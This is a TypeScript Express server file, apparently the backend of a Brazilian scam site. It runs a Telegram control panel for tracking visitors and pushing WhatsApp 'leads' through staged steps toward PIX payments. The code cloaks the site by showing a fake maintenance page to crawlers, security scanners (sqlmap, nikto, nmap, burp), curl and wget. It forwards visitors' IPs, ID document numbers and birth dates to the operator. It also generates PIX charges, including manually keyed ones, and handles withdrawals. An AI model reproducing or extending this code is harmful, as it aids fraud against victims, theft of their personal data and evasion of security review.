const BOT_UA_PATTERNS = [
  "googlebot", "adsbot", "bingbot", "yandex", "baiduspider", "facebookexternalhit",
  "twitterbot", "rogerbot", "linkedinbot", "embedly", "quora link preview",
  "showyoubot", "outbrain", "pinterest/0.", "developers.google.com/+/web/snippet",
  "slackbot", "vkShare", "W3C_Validator", "redditbot", "Applebot",
  "flipboard", "tumblr", "bitlybot", "SkypeShell", "bitlybot", "Zetabot",
  "facebookplatform", "chrome-lighthouse", "headlesschrome", "puppeteer",
  "selenium", "playwright", "python-requests", "curl", "wget", "postman",
  "insomnia", "scanner", "sqlmap", "nikto", "nmap", "burp",
  "hostinger", "hostgator", "locaweb", "aws-sdk", "python", "go-http", "java",
  "ahrefs", "semrush", "dotbot", "mj12bot", "uipbot", "exabot", "gigabot"
];

function isBot(ua: string | undefined): boolean {
  if (!ua) return false;
  const lowUA = ua.toLowerCase();
  return BOT_UA_PATTERNS.some(pattern => lowUA.includes(pattern));
}

const DUMMY_HTML = `
<!DOCTYPE html>
<html>
<head><title>Default Website Page</title><meta charset="UTF-8"><style>body { font-family: sans-serif; background: #f0f2f5; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; } .card { background: white; padding: 40px; border-radius: 8px; text-align: center; max-width: 500px; }</style></head>
<body><div class="card"><h1>Website under maintenance</h1><p>This website is currently undergoing scheduled maintenance. We should be back shortly.</p></div></body>
</html>`;

app.use((req, res, next) => {
  const ua = req.headers["user-agent"];
  if (isBot(ua) && !req.url.startsWith('/api') && !req.url.includes('.')) {
    console.log(`🛡️ [CLOAKING] Bot detectado e bloqueado: ${ua} | URL: ${req.url}`);
    return res.status(200).send(DUMMY_HTML);
  }
  next();
});

app.use(express.json());
app.use(express.static(path.join(process.cwd(), 'dist')));


// Helper to send/edit Telegram messages
async function sendTelegram(text: string, messageId?: number, replyMarkup?: any) {
  if (!TG_TOKEN || !CHAT_ID) return null;
  try {
    const url = messageId ? `${TELEGRAM_URL}/editMessageText` : `${TELEGRAM_URL}/sendMessage`;
    const payload: any = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
    if (messageId) payload.message_id = messageId;
    if (replyMarkup) payload.reply_markup = replyMarkup;
    const res = await axios.post(url, payload);
    return res.data.result.message_id;
  } catch (err: any) {
    const errMessage = err.response?.data?.description || err.message;

    // Sem mudança de conteúdo — ignorar silenciosamente
    if (errMessage.includes('message is not modified')) return messageId ?? null;

    // Mensagem é uma foto (QR Code) — tenta editar a legenda (caption)
    const isPhotoMsg = errMessage.includes('there is no text in the message') ||
      errMessage.includes("message can't be edited");
    if (isPhotoMsg && messageId) {
      try {
        const res = await axios.post(`${TELEGRAM_URL}/editMessageCaption`, {
          chat_id: CHAT_ID, message_id: messageId, caption: text, parse_mode: 'HTML',
          ...(replyMarkup ? { reply_markup: replyMarkup } : {})
        });
        return res.data.result?.message_id || messageId;
      } catch (_) {
        return sendTelegram(text, undefined, replyMarkup);
      }
    }

    // Qualquer outro erro de edição: envia nova mensagem
    if (messageId) {
      console.warn(`⚠️ [TELEGRAM] Não foi possível editar msg ${messageId}, enviando nova.`);
      return sendTelegram(text, undefined, replyMarkup);
    }

    console.error(`❌ [TELEGRAM] Erro ao enviar: ${errMessage}`);
    return null;
  }
}

async function sendTelegramPhoto(buffer: Buffer, caption: string, replyMarkup?: any): Promise<number | null> {
  if (!TG_TOKEN || !CHAT_ID) return null;
  try {
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', buffer, { filename: 'qr.png', contentType: 'image/png' });
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');
    if (replyMarkup) form.append('reply_markup', JSON.stringify(replyMarkup));

    // axios explicitly needs headers from FormData in node environments
    const headers = form.getHeaders();

    const res = await axios.post(`${TELEGRAM_URL}/sendPhoto`, form, { headers });
    return res.data.result?.message_id || null;
  } catch (e: any) {
    console.error(`❌ [TELEGRAM] Erro sendPhoto:`, e.response?.data?.description || e.message);
    return null;
  }
}

function escapeHtml(text: string | undefined | null) {
  if (!text) return "";
  return String(text).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

app.post("/api/v1/session/start", async (req, res) => {
  const { device, location, userId } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "0.0.0.0";
  if (sessions.has(userId)) return res.json({ status: "exists" });
  const startTime = Date.now();

  const safeIp = escapeHtml(String(ip));
  const safeDevice = escapeHtml(String(device));

  const messageId = await sendTelegram(`<b>👤 NOVO VISITANTE</b>\n\n<b>IP:</b> ${safeIp}\n<b>Device:</b> ${safeDevice}\n<b>Status:</b> 🟢 Navegando...`);
  sessions.set(userId, { messageId: messageId || 0, startTime, lastHeartbeat: startTime, ip: String(ip), device, location: location || 'Brasil', converted: false, docValue: "", birthDate: "" });
  saveVisitors();
  recordVisitor();
  res.json({ status: "started", userId });
});

app.post("/api/v1/session/heartbeat", (req, res) => {
  const { userId } = req.body;
  const session = sessions.get(userId);
  if (session) { session.lastHeartbeat = Date.now(); res.json({ status: "alive" }); }
  else res.json({ status: "not_found" });
});

app.post("/api/v1/session/convert", async (req, res) => {
  const { userId, details } = req.body;
  const session = sessions.get(userId);
  if (session && !session.converted) {
    session.converted = true;
    session.docValue = details.docValue;
    session.birthDate = details.birthDate;

    const safeIp = escapeHtml(session.ip);
    const msg = `<b>🔥 CONVERSÃO!</b>\n\n<b>IP:</b> ${safeIp}\n<b>Documento:</b> ${details.docValue}\n<b>Nascimento:</b> ${details.birthDate}\n<b>Status:</b> ✅ NO WHATSAPP`;
    await sendTelegram(msg, session.messageId || undefined);
    saveVisitors();
    recordConversion();
    res.json({ status: "converted" });
  } else res.json({ status: "ignored" });
});

app.get("/api/v1/session/data/:userId", (req, res) => {
  const { userId } = req.params;
  const session = sessions.get(userId);
  if (session) {
    res.json({
      docValue: session.docValue,
      birthDate: session.birthDate,
      fullName: "" // We don't have full name from site yet, but bot expects it
    });
  } else {
    res.status(404).json({ status: "not_found" });
  }
});

// Endpoint de Callback do Gateway (FastSoftBrasil)
app.post("/api/v1/gateway/callback", async (req, res) => {
  const { status, transactionId, customer } = req.body;
  console.log(`📡 [CALLBACK] Recebido: Transação ${transactionId} | Status: ${status}`);

  if (status === 'PAID' || status === 'confirmed') {
    const email = customer?.email;
    const name = customer?.name || "Titular";

    // Verifica se este transactionId pertence a um lead (PIX automático)
    const leadChatId = pixLeadMap.get(String(transactionId));
    if (leadChatId) {
      console.log(`💰 [CALLBACK] PIX pago por lead: ${leadChatId} — escrevendo cmd-pix-paid`);
      fs.writeFileSync(`cmd-pix-paid-${Date.now()}.json`, JSON.stringify({ chatId: leadChatId, transId: transactionId }));
      pixLeadMap.delete(String(transactionId)); // Remove do mapa após usar
    }

    if (email && validateEmail(email)) {
      console.log(`🚀 [AUTO-EMAIL] Pagamento confirmado! Enviando comprovante para ${email}...`);
      await sendSuccessEmail(email, name, transactionId);
      await sendTelegram(`💰 <b>PAGAMENTO CONFIRMADO!</b>\n\nTransação: <code>${transactionId}</code>\nLead: ${name}\nE-mail: ${email}${leadChatId ? `\nWhatsApp: <code>${leadChatId}</code>` : ''}\n\n✅ <i>Etapa 4 concluída automaticamente. E-mail enviado.</i>`);
    } else {
      await sendTelegram(`💰 <b>PAGAMENTO CONFIRMADO!</b>\n\nTransação: <code>${transactionId}</code>\nLead: ${name}${leadChatId ? `\nWhatsApp: <code>${leadChatId}</code>` : ''}\n\n${leadChatId ? '✅ <i>Etapa 4 concluída automaticamente.</i>' : '⚠️ <i>E-mail não informado.</i>'}`);
    }
  }
  res.sendStatus(200);
});

app.post("/api/v1/session/end", async (req, res) => {
  const { userId } = req.body;
  const session = sessions.get(userId);
  if (session && !session.converted) {
    const safeIp = escapeHtml(session.ip);
    await sendTelegram(`<b>🔴 VISITANTE SAIU</b>\n\n<b>IP:</b> ${safeIp}\n<b>Status:</b> Saiu sem converter`, session.messageId || undefined);
    sessions.delete(userId);
  }
  res.json({ status: "ok" });
});

// Cleanup
setInterval(async () => {
  const now = Date.now();
  for (const [userId, session] of sessions.entries()) {
    if (!session.converted && now - session.lastHeartbeat > 60000) {
      const safeIp = escapeHtml(session.ip);
      await sendTelegram(`<b>⚪ VISITANTE OFFLINE</b>\n\n<b>IP:</b> ${safeIp}\n<b>Status:</b> Desconectado`, session.messageId || undefined);
      sessions.delete(userId);
    }
  }
  checkAndResetStats();
}, 30000);

// --- Dashboard Logic ---
async function startTelegramPolling() {
  if (!TG_TOKEN) return;

  // Clear any existing webhooks to prevent 409 Conflict errors
  try {
    await axios.get(`${TELEGRAM_URL}/deleteWebhook`);
    console.log("🧹 [TELEGRAM] Webhooks limpos, iniciando polling...");
  } catch (e) {
    // Ignore error if it fails
  }

  let lastUpdateId = 0;
  console.log("🤖 Dashboard Telegram Ativo.");

  while (true) {
    try {
      const response = await axios.get(`${TELEGRAM_URL}/getUpdates`, { params: { offset: lastUpdateId + 1, timeout: 30 } });
      for (const update of response.data.result) {
        lastUpdateId = update.update_id;
        const cb = update.callback_query;
        const msg = update.message || cb?.message;
        const userId = cb ? cb.from.id : msg?.from?.id;
        if (!userId || (CHAT_ID && String(msg?.chat?.id) !== String(CHAT_ID))) continue;

        const text = (cb ? cb.data : msg?.text || "").toLowerCase();
        const msgId = msg?.message_id;

        // Feedback visual no Telegram (Loading no topo)
        if (cb) await axios.post(`${TELEGRAM_URL}/answerCallbackQuery`, { callback_query_id: cb.id });

        if (text === "/start" || text === "/painel" || text === "painel:back" || text === "painel:start") {
          const stats = getBotStatusInfo('main');
          checkAndResetStats();

          const allSessions = Array.from(sessions.values());
          const now = Date.now();

          const activeNow = allSessions.filter(s => !s.converted && (now - (s.lastHeartbeat || 0) <= 60000)).length;
          const conversionsActive = allSessions.filter(s => s.converted).length;
          const abandoned = botStats.totalVisitors - botStats.totalConversions - activeNow;

          // ... (attendants logic remains same, I'll include it to be sure of the range)
          let attendantsOnline = 0;
          let attendantsList = "";
          for (let i = 1; i <= MAX_SLOTS; i++) {
            const id = i === 1 ? 'main' : `parceiro${i}`;
            try {
              const statusPath = path.join(process.cwd(), `bot-status-${id}.json`);
              if (fs.existsSync(statusPath)) {
                const d = JSON.parse(fs.readFileSync(statusPath, 'utf-8'));
                if (d.status === 'CONNECTED') {
                  attendantsOnline++;
                  attendantsList += `\n   ├ ✅ <b>${d.adminName || (i === 1 ? 'Perfil Principal' : 'Atendente ' + i)}</b>`;
                } else {
                  attendantsList += `\n   ├ 🔴 ${i === 1 ? 'Perfil Principal' : 'Atendente ' + i} (Offline)`;
                }
              } else {
                attendantsList += `\n   ├ ⚪ ${i === 1 ? 'Perfil Principal' : 'Atendente ' + i} (Inativo)`;
              }
            } catch (_) {
              attendantsList += `\n   ├ ⚪ Slot ${i} (Erro)`;
            }
          }

          const dashText = `🎮 <b>PAINEL DE CONTROLE SVR — GESTÃO TOTAL</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
            `📱 <b>NÚMERO MAIN:</b> <code>+${currentConfig.whatsappNumber}</code>\n` +
            `🤖 <b>STATUS BOT:</b> ${stats.emoji} ${stats.label}\n\n` +
            `👤 <b>ATENDENTES CONECTADOS (${attendantsOnline}/${MAX_SLOTS}):</b>` +
            `${attendantsList}\n\n` +
            `📈 <b>MÉTRICAS DE VISITANTES:</b>\n` +
            `├ 📅 <b>Visitantes (Hoje):</b> ${botStats.visitorsToday}\n` +
            `├ 🗓️ <b>Visitantes (Semana):</b> ${botStats.visitorsWeek}\n` +
            `└ 🌐 <b>Visitantes (Total):</b> ${botStats.totalVisitors}\n\n` +
            `📊 <b>CONVERSÃO E RETENÇÃO:</b>\n` +
            `├ 👥 <b>Ativos no Site:</b> ${activeNow}\n` +
            `├ ❌ <b>Abandonos:</b> ${abandoned}\n` +
            `├ ✅ <b>Leads (Hoje):</b> ${botStats.conversionsToday}\n` +
            `├ ✅ <b>Leads (Semana):</b> ${botStats.conversionsWeek}\n` +
            `└ ✅ <b>Leads (Total):</b> ${botStats.totalConversions}\n\n` +
            `👥 <b>FILA ATUAL:</b> ${getQueueInfo().length} leads aguardando\n` +
            `🕒 <b>HORA:</b> ${new Date().toLocaleTimeString('pt-BR', { timeZone: 'America/Sao_Paulo' })}\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
            `<b>ESCOLHA UMA AÇÃO:</b>`;

          const kb = {
            inline_keyboard: [
              [{ text: "📊 Atualizar Métricas", callback_data: "painel:start" }, { text: "👥 Gerenciar Fila", callback_data: "painel:fila" }],
              [{ text: "💰 Painel Financeiro", callback_data: "painel:financeiro_auth" }, { text: "📧 Configurar SMTP", callback_data: "painel:config_smtp" }],
              [{ text: "⚡ PIX Rápido", callback_data: "cmd:last_pix" }, { text: "🛠️ Config Gateway", callback_data: "painel:config_pix" }],
              [{ text: "📱 Gestão de WhatsApp", callback_data: "painel:slots" }, { text: "🔄 Reiniciar Main", callback_data: "painel:reiniciar:slot:main" }]
            ]
          };
          await sendTelegram(dashText, cb ? msgId : undefined, kb);
        }
        else if (text === "painel:status") {
          // Conta atendentes REALMENTE conectados (bots com status CONNECTED)
          let attendantsOnline = 0;
          for (let i = 1; i <= MAX_SLOTS; i++) {
            const id = i === 1 ? 'main' : `parceiro${i}`;
            try {
              const statusPath = path.join(process.cwd(), `bot-status-${id}.json`);
              if (fs.existsSync(statusPath)) {
                const data = JSON.parse(fs.readFileSync(statusPath, 'utf-8'));
                if (data.status === 'CONNECTED') attendantsOnline++;
              }
            } catch (_) { }
          }
          const siteVisitors = Array.from(sessions.values()).filter(s => !s.converted).length;
          const conversions = Array.from(sessions.values()).filter(s => s.converted).length;
          await sendTelegram(`📊 <b>STATUS DETALHADO</b>\n\n👤 <b>Atendentes Conectados:</b> ${attendantsOnline}\n🌐 <b>Visitantes no Site:</b> ${siteVisitors}\n✅ <b>Conversões:</b> ${conversions}\n🕒 <b>Uptime:</b> ${Math.floor(process.uptime() / 60)} min\n\n<i>Atualizado agora.</i>`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
        }
        else if (text === "painel:fila") {
          const queue = getQueueInfo();
          let txt = "👥 <b>LISTA DE LEADS (FILA)</b>\n\n";
          let btns = [];

          if (queue.length === 0) {
            txt += "<i>Ninguém na fila agora.</i>";
          } else {
            txt += `Atualmente existem <b>${queue.length}</b> leads aguardando.\n\nEscolha um lead abaixo para gerenciar:`;
            queue.slice(0, 15).forEach((l: any) => {
              const phone = l.chatId.split('@')[0];
              btns.push([{ text: `📱 ${phone} (${l.name || 'Sem Nome'})`, callback_data: `painel:lead_control:${l.chatId}` }]);
            });
          }

          btns.push([{ text: "⬅️ Voltar", callback_data: "painel:back" }]);
          await sendTelegram(txt, msgId, { inline_keyboard: btns });
        }
        else if (text.startsWith("painel:lead_control:")) {
          const chatId = text.split(":")[2];
          const phone = chatId.split('@')[0];

          // Salva como último lead para facilitar geração de PIX rápida
          fs.writeFileSync('last-lead.json', JSON.stringify({ chatId }));

          const txt = `👤 <b>CONTROLE DO LEAD: ${phone}</b>\n\n` +
            `Escolha uma ação para enviar ao WhatsApp do lead:`;

          const kb = {
            inline_keyboard: [
              [{ text: "🟢 Liberar Etapa 2", callback_data: `etapa:2:${chatId}` }, { text: "🔐 Liberar Etapa 3", callback_data: `etapa:3:${chatId}` }],
              [{ text: "💳 Liberar Etapa 4", callback_data: `etapa:4:${chatId}` }, { text: "✨ Finalizar (Etapa 5)", callback_data: `etapa:5:${chatId}` }],
              [{ text: "💰 GERAR PIX (COBRAR)", callback_data: `cmd:last_pix` }],
              [{ text: "⬅️ Voltar para Lista", callback_data: "painel:fila" }]
            ]
          };
          await sendTelegram(txt, msgId, kb);
        }
        else if (text === "cmd:ping") {
          await sendTelegram("✅ <b>SISTEMA OPERACIONAL</b>\n\nLatência: 42ms\nBanco de Dados: OK\nWhatsApp: OK", msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
        }
        else if (text === "painel:slots") {
          let btns = [];
          for (let i = 1; i <= MAX_SLOTS; i++) {
            const id = i === 1 ? 'main' : `parceiro${i}`;
            const label = i === 1 ? 'Perfil 1 (Admin/Main)' : `Atendente ${i}`;
            btns.push([{ text: `⚙️ Configurar ${label}`, callback_data: `painel:manage:${id}` }]);
          }
          btns.push([{ text: "⬅️ Voltar", callback_data: "painel:back" }]);
          await sendTelegram(`🤖 <b>GESTÃO DE PERFIS (WHATSAPP)</b>\n\nEscolha um slot para configurar:`, msgId, { inline_keyboard: btns });
        }
        else if (text.startsWith("painel:manage:")) {
          const id = text.split(":")[2];
          await sendTelegram(`⚙️ <b>GERENCIAR: ${id === 'main' ? 'Perfil 1 (Admin)' : 'Atendente ' + id.replace('parceiro', '')}</b>\n\nEscolha uma ação de sistema:`, msgId, {
            inline_keyboard: [
              [{ text: "📲 Conectar / Gerar QR Code", callback_data: `generate_qr:${id}` }],
              [{ text: "🔄 Reiniciar Instância", callback_data: `painel:reiniciar:slot:${id}` }],
              [{ text: "🔌 Desconectar (Apagar)", callback_data: `painel:desconectar:slot:${id}` }],
              [{ text: "⬅️ Voltar", callback_data: "painel:slots" }]
            ]
          });
        }
        else if (text.startsWith("painel:desconectar:slot:")) {
          const id = text.split(":")[3];
          stopBot(id);
          const sessionPath = path.join(process.cwd(), '.wwebjs_auth', `session-${id}`);
          if (fs.existsSync(sessionPath)) {
            try { fs.rmSync(sessionPath, { recursive: true, force: true }); } catch (e) { }
          }
          await sendTelegram(`✅ <b>DESCONECTADO!</b>\n\nA sessão do slot <b>${id}</b> foi apagada.\nVocê pode conectar um novo número agora.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:slots" }]] });
        }
        else if (text.startsWith("painel:reiniciar:slot:")) {
          const id = text.split(":")[3];
          startBot(id);
          await sendTelegram(`✅ <b>SOLICITAÇÃO ENVIADA!</b>\n\nO slot <b>${id}</b> está sendo reiniciado agora.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
        }
        else if (text === "cmd:last_pix") {
          if (fs.existsSync('last-lead.json')) {
            const last = JSON.parse(fs.readFileSync('last-lead.json', 'utf-8'));
            const txt = `💰 <b>GERAR PROTOCOLO PIX</b>\n\nLead: <code>${last.chatId}</code>\n\n<i>Escolha o sistema de geração:</i>`;
            const kb = {
              inline_keyboard: [
                [{ text: "⚡ Sistema Padrão (Auto)", callback_data: `pix_sel:auto:${last.chatId}` }],
                [{ text: "⚙️ Pré-Automático (Config)", callback_data: `pix_sel:preauto:${last.chatId}` }],
                [{ text: "🛠️ Sistema Modificado (Manual)", callback_data: `pix_sel:manual:${last.chatId}` }],
                [{ text: "⬅️ Voltar", callback_data: "painel:back" }]
              ]
            };
            await sendTelegram(txt, msgId, kb);
          } else {
            await sendTelegram("❌ <b>ERRO:</b> Nenhum lead recente encontrado.", msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
          }
        }
        else if (text.startsWith("pix_sel:auto:")) {
          const chatId = text.split(":")[2];
          botStates.set(userId, { action: 'pix_auto_await_value', data: { chatId } });
          await sendTelegram(`⚡ <b>SISTEMA PADRÃO (AUTO)</b>\n\nLead: <code>${chatId}</code>\n\nPor favor, <b>digite o valor</b> do PIX (ex: 97.50):`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:back" }]] });
        }
        else if (text.startsWith("pix_sel:preauto:")) {
          const chatId = text.split(":")[2];
          botStates.set(userId, {
            action: 'pix_preauto_menu',
            data: {
              chatId,
              amount: "0.00",
              name: currentConfig.pixName,
              email: currentConfig.pixEmail,
              doc: currentConfig.pixDocument
            }
          });
          await showPixPreAutoMenu(userId, msgId);
        }
        else if (text.startsWith("pix_sel:manual:")) {
          const chatId = text.split(":")[2];
          botStates.set(userId, {
            action: 'pix_manual_menu',
            data: {
              chatId,
              key: '',
              amount: "0.00",
              name: currentConfig.pixName,
              doc: currentConfig.pixDocument
            }
          });
          await showPixManualMenu(userId, msgId);
        }
        else if (text.startsWith("pix_pre:edit:")) {
          const field = text.split(":")[2];
          const labels: any = { amount: "Valor (R$)", name: "Nome do Recebedor", email: "E-mail", doc: "Documento (CPF/CNPJ)" };
          botStates.set(userId, { action: `pix_preauto_edit_${field}`, data: botStates.get(userId)?.data });
          await sendTelegram(`📝 <b>EDITAR ${labels[field].toUpperCase()}</b>\n\nPor favor, digite o novo valor para este campo:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "pix_pre:menu_back" }]] });
        }
        else if (text === "pix_pre:menu_back") {
          const state = botStates.get(userId);
          if (state) {
            state.action = 'pix_preauto_menu';
            botStates.set(userId, state);
            await showPixPreAutoMenu(userId, msgId);
          }
        }
        else if (text === "pix_pre:exec") {
          const state = botStates.get(userId);
          if (!state) return;
          const { chatId, amount, name, email, doc } = state.data;
          botStates.delete(userId);
          await generateStandardPix(chatId, parseFloat(amount), msgId, { name, email, doc });
        }
        else if (text.startsWith("pix_mod:edit:")) {
          const field = text.split(":")[2];
          const labels: any = { amount: "Valor (R$)", key: "Chave PIX", name: "Nome do Recebedor", doc: "Documento (CPF/CNPJ)" };
          botStates.set(userId, { action: `pix_manual_edit_${field}`, data: botStates.get(userId)?.data });
          await sendTelegram(`📝 <b>EDITAR ${labels[field].toUpperCase()}</b>\n\nPor favor, digite o novo valor para este campo:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "pix_mod:menu_back" }]] });
        }
        else if (text === "pix_mod:menu_back") {
          const state = botStates.get(userId);
          if (state) {
            state.action = 'pix_manual_menu';
            botStates.set(userId, state);
            await showPixManualMenu(userId, msgId);
          }
        }
        else if (text === "pix_mod:exec") {
          const state = botStates.get(userId);
          if (!state || !state.data.key || !state.data.amount || parseFloat(state.data.amount) <= 0) {
            await axios.post(`${TELEGRAM_URL}/answerCallbackQuery`, { callback_query_id: cb.id, text: "⚠️ Defina Chave e Valor primeiro!", show_alert: true });
            return;
          }
          const { chatId, key, name, doc, amount } = state.data;
          botStates.delete(userId);
          await generateModifiedPix(chatId, parseFloat(amount), key, name, doc);
        }
        else if (text.startsWith("generate_qr:")) {
          const id = text.split(":")[1];
          resetBotSession(id);
          await sendTelegram(`📲 <b>GERANDO QR CODE...</b>\n\nO processo foi iniciado para <b>${id}</b>. Aguarde o QR nos logs ou Telegram.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
        }
        else if (text === "painel:config_pix") {
          const txt = `🛠️ <b>CONFIGURAÇÃO DO GATEWAY PIX</b>\n\n` +
            `👤 <b>Nome:</b> ${currentConfig.pixName}\n` +
            `📧 <b>E-mail:</b> ${currentConfig.pixEmail}\n` +
            `📄 <b>Documento:</b> ${currentConfig.pixDocument}\n` +
            `💸 <b>Taxa Gateway:</b> ${currentConfig.gatewayFee}%\n\n` +
            `<i>Estes dados serão usados na geração de protocolos padrão (Auto).</i>`;
          const kb = {
            inline_keyboard: [
              [{ text: "👤 Editar Nome", callback_data: "painel:edit_pix:name" }, { text: "📧 Editar E-mail", callback_data: "painel:edit_pix:email" }],
              [{ text: "📄 Editar Documento", callback_data: "painel:edit_pix:doc" }, { text: "💸 Editar Taxa", callback_data: "painel:edit_pix:fee" }],
              [{ text: "⬅️ Voltar", callback_data: "painel:back" }]
            ]
          };
          await sendTelegram(txt, msgId, kb);
        }
        else if (text === "painel:config_smtp") {
          const txt = `📧 <b>CONFIGURAÇÃO SMTP (E-MAIL)</b>\n\n` +
            `🏷️ <b>Nome Remetente:</b> ${currentConfig.smtpSenderName}\n` +
            `🌐 <b>Host:</b> ${currentConfig.smtpHost}\n` +
            `🔌 <b>Porta:</b> ${currentConfig.smtpPort}\n` +
            `👤 <b>Usuário:</b> ${currentConfig.smtpUser}\n` +
            `🔑 <b>Senha:</b> ${currentConfig.smtpPass ? '********' : 'Pendente'}\n\n` +
            `<i>Configure para o envio automático de comprovantes aos leads.</i>`;
          const kb = {
            inline_keyboard: [
              [{ text: "🏷️ Nome Remetente", callback_data: "painel:edit_smtp:name" }],
              [{ text: "🌐 Host", callback_data: "painel:edit_smtp:host" }, { text: "🔌 Porta", callback_data: "painel:edit_smtp:port" }],
              [{ text: "👤 Usuário", callback_data: "painel:edit_smtp:user" }, { text: "🔑 Senha", callback_data: "painel:edit_smtp:pass" }],
              [{ text: "⬅️ Voltar", callback_data: "painel:back" }]
            ]
          };
          await sendTelegram(txt, msgId, kb);
        }
        else if (text.startsWith("painel:edit_smtp:")) {
          const field = text.split(":")[2];
          const labels: any = { name: "Nome do Remetente", host: "Host SMTP", port: "Porta", user: "Usuário/E-mail", pass: "Senha/App Password" };
          botStates.set(userId, { action: `awaiting_smtp_edit_${field}` });
          await sendTelegram(`📝 <b>EDITAR ${labels[field].toUpperCase()}</b>\n\nPor favor, digite o novo valor para este campo:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:config_smtp" }]] });
        }
        else if (text === "painel:financeiro_auth") {
          botStates.set(userId, { action: 'awaiting_financial_password' });
          await sendTelegram(`🔐 <b>ACESSO RESTRITO</b>\n\nPor favor, informe a <b>Senha Financeira</b> para acessar o saldo e saques:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:back" }]] });
        }
        else if (text === "painel:whatsapp_auth") {
          botStates.set(userId, { action: 'awaiting_whatsapp_password' });
          await sendTelegram(`🔐 <b>SEGURANÇA EXIGIDA</b>\n\nPor favor, informe a <b>Senha de Segurança</b> (a mesma do financeiro) para gerenciar o WhatsApp:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:back" }]] });
        }
        else if (text === "painel:financeiro_menu") {
          const balance = await getGatewayBalance();
          if (!balance) {
            await sendTelegram(`❌ <b>ERRO</b>\n\nNão foi possível consultar o saldo. Verifique as chaves da gateway no .env`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
            return;
          }

          const totalAvailable = balance.available / 100;
          const fee = (totalAvailable * (currentConfig.withdrawalFeePercent / 100)) + currentConfig.withdrawalFeeFixed;
          const netAmount = Math.max(0, totalAvailable - fee);

          const txt = `💰 <b>PAINEL FINANCEIRO (GATEWAY)</b>\n\n` +
            `🟢 <b>Disponível Bruto:</b> R$ ${totalAvailable.toFixed(2)}\n` +
            `💸 <b>Taxas de Saque:</b> R$ ${fee.toFixed(2)}\n` +
            `💰 <b>Líquido para Receber:</b> <b>R$ ${netAmount.toFixed(2)}</b>\n\n` +
            `🟡 <b>Pendente:</b> R$ ${(balance.pending / 100).toFixed(2)}\n` +
            `🔴 <b>Bloqueado:</b> R$ ${(balance.blocked / 100).toFixed(2)}\n\n` +
            `📋 <b>CONTA DE RECEBIMENTO:</b>\n` +
            `• PIX: <code>${currentConfig.adminPixKey || 'Não definida'}</code> (${currentConfig.adminPixType})\n` +
            `• Nome: ${currentConfig.adminPixName || 'N/D'}`;

          const kb = {
            inline_keyboard: [
              [{ text: "💸 Solicitar Saque Total", callback_data: "painel:saque_total" }],
              [{ text: "⚙️ Configurar Conta Saque", callback_data: "painel:config_saque" }],
              [{ text: "📊 Ajustar Taxas de Saque", callback_data: "painel:config_taxas_saque" }],
              [{ text: "🔑 Alterar Senha Financeira", callback_data: "painel:edit_fin:pass" }],
              [{ text: "⬅️ Voltar", callback_data: "painel:back" }]
            ]
          };
          await sendTelegram(txt, msgId, kb);
        }
        else if (text === "painel:config_taxas_saque") {
          const txt = `📊 <b>CONFIGURAÇÃO DE TAXAS DE SAQUE</b>\n\n` +
            `💵 <b>Taxa Fixa:</b> R$ ${currentConfig.withdrawalFeeFixed.toFixed(2)}\n` +
            `📈 <b>Taxa Variável:</b> ${currentConfig.withdrawalFeePercent.toFixed(2)}%\n\n` +
            `<i>Estas taxas são usadas apenas para exibição do valor líquido no painel.</i>`;
          const kb = {
            inline_keyboard: [
              [{ text: "💵 Editar Taxa Fixa", callback_data: "painel:edit_saque_fee:fixed" }],
              [{ text: "📈 Editar Taxa %", callback_data: "painel:edit_saque_fee:percent" }],
              [{ text: "⬅️ Voltar", callback_data: "painel:financeiro_menu" }]
            ]
          };
          await sendTelegram(txt, msgId, kb);
        }
        else if (text.startsWith("painel:edit_saque_fee:")) {
          const field = text.split(":")[2];
          const label = field === 'fixed' ? 'Taxa Fixa (R$)' : 'Taxa Variável (%)';
          botStates.set(userId, { action: `awaiting_saque_fee_edit_${field}` });
          await sendTelegram(`📝 <b>EDITAR ${label.toUpperCase()}</b>\n\nDigite o novo valor:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:config_taxas_saque" }]] });
        }
        else if (text === "painel:config_saque") {
          const txt = `⚙️ <b>CONFIGURAÇÃO DE CONTA PARA SAQUE</b>\n\n` +
            `🔑 <b>Chave PIX:</b> ${currentConfig.adminPixKey || 'Pendente'}\n` +
            `🏷️ <b>Tipo:</b> ${currentConfig.adminPixType}\n` +
            `👤 <b>Nome:</b> ${currentConfig.adminPixName || 'Pendente'}\n` +
            `📄 <b>CPF/CNPJ:</b> ${currentConfig.adminPixDoc || 'Pendente'}`;
          const kb = {
            inline_keyboard: [
              [{ text: "🔑 Chave PIX", callback_data: "painel:edit_saque:key" }, { text: "🏷️ Tipo", callback_data: "painel:edit_saque:type" }],
              [{ text: "👤 Nome", callback_data: "painel:edit_saque:name" }, { text: "📄 Documento", callback_data: "painel:edit_saque:doc" }],
              [{ text: "⬅️ Voltar", callback_data: "painel:financeiro_menu" }]
            ]
          };
          await sendTelegram(txt, msgId, kb);
        }
        else if (text.startsWith("painel:edit_saque:")) {
          const field = text.split(":")[2];
